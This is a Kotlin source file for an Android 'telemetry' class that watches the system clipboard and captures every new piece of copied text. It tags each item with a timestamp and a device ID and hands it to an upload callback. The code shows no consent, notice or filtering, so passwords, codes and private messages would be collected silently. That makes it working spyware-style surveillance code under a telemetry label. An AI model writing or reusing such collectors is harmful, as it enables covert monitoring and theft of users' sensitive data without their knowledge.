package com.pulsedrop.telemetry.collectors

import android.content.ClipboardManager
import android.content.Context
import com.pulsedrop.telemetry.data.ClipboardEntry
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class ClipboardCollector(
    private val context: Context,
    private val onData: (UploadEnvelope) -> Unit
) {
    private val prefs = PrefsManager(context)
    private val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    private var lastText: String? = null

    fun startMonitoring() {
        clipboard.addPrimaryClipChangedListener(listener)
    }

    fun stopMonitoring() {
        clipboard.removePrimaryClipChangedListener(listener)
    }

    private val listener = ClipboardManager.OnPrimaryClipChangedListener {
        val clip = clipboard.primaryClip
        if (clip != null && clip.itemCount > 0) {
            val text = clip.getItemAt(0).coerceToText(context).toString()
            if (text.isNotEmpty() && text != lastText) {
                lastText = text
                val entry = ClipboardEntry(text = text, timestamp = System.currentTimeMillis())
                onData(UploadEnvelope("clipboard", prefs.deviceId, System.currentTimeMillis(), entry))
            }
        }
    }

    fun readCurrent(): ClipboardEntry? {
        val clip = clipboard.primaryClip ?: return null
        if (clip.itemCount == 0) return null
        val text = clip.getItemAt(0).coerceToText(context).toString()
        return if (text.isNotEmpty()) ClipboardEntry(text, System.currentTimeMillis()) else null
    }
}
